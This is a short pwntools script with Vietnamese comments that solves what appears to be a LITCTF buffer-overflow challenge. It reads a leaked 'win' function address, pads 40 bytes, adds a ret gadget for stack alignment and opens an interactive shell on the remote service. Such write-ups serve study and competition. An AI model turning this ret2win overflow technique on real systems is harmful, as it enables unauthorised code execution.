from pwn import *

p = remote('litctf.org', 31771)

# elf = ELF('./note')
# p = process(elf.path)

# Nhận địa chỉ của hàm win
p.recvuntil(b'Go to: ')
win_addr_str = p.recvline().strip()
win_addr = int(win_addr_str, 16)
log.info(f"Đã tìm thấy địa chỉ của hàm win: {hex(win_addr)}")

# --- TÌM GADGET ---
# Chạy lệnh này trên terminal của bạn: ROPgadget --binary ./note --only "ret"
# và điền địa chỉ vào đây. 
# Địa chỉ này thường không thay đổi vì PIE (Position Independent Executable) thường bị tắt trong các bài CTF dễ.
# Giả sử địa chỉ tìm được là 0x40101a
ret_gadget_addr = 0x40101a 
# Nếu binary của bạn khác, địa chỉ này có thể khác. Ví dụ nó có thể là 0x40120b hoặc một địa chỉ gần đó.
# Bạn PHẢI tự tìm địa chỉ này bằng ROPgadget.

# --- Tạo payload ---
offset = 40
padding = b'A' * offset

# Payload mới bao gồm ret gadget để căn chỉnh stack
payload = padding + p64(ret_gadget_addr) + p64(win_addr)

# log.info("Payload đã được tạo (với ret gadget):")
# print(hexdump(payload))

# Gửi payload
p.sendline(payload)
log.success("Payload đã được gửi! Chuyển sang chế độ tương tác...")

# Nhận shell
p.interactive()